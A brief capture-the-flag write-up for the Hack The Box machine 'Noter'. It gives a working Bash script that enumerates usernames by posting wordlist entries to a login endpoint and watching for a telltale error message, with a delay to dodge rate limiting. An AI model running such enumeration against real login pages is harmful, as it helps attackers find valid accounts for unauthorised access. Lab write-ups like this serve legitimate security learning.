# Noter

The box will put your logic to the test.

At the beginning, to access the targeted backend, I needed this tiny Bash script:

```bash
for w in $(cat $1)
do
    r=$(curl -X POST -d "username=$w" -d "password=123" "http://$2/login")
    if [[ $r == *"Invalid login"* ]]; then
        echo "$w" > username.txt
        exit 0
    fi
    sleep .25 # in case of rate limiting
done
```

`$1` is for the path to your wordlist (for usernames), and `$2` is for the IP machine to attack.

It does not give you the password because we want to find the username here. I've read comments on the HTB forum that say you can find it without any brute force. Well, even if the username is in a notorious wordlist (not Rockyou), it's still pretty uncommon in such context.
